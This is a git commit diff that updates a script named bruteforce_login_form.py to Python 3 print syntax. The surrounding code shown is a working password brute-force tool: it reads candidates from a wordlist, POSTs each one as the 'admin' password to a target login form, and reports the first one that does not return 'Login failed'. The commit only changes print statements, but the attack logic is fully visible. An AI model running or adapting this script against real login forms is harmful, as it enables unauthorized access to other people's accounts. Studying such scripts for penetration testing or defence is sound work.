f488b892daacb5711814ee2b4a988c6b7242c1db
Ryland Rubens <39800803+ryrubes@users.noreply.github.com>
2023-11-01 13:31:04 -0700

    Update bruteforce_login_form.py to python3 syntax

--- bruteforce_login_form.py
+++ bruteforce_login_form.py
@@ -11,13 +11,13 @@ data_dict = {"username":"admin","password":"","Login":"submit"}
 with open("password.lst","r") as wordlist_file:
 	i=1
 	for line in wordlist_file:
-		print i
+		print(i)
 		word = line.strip()
 		data_dict["password"] = word
 		response = requests.post(target_url, data=data_dict)
 		i = i+1
 		if "Login failed" not in response.content:
-			print "[+] Got the Password ----> " + word
+			print("[+] Got the Password ----> " + word)
 			exit()
 
-print "[+] Reached end of line "
+print("[+] Reached end of line ")
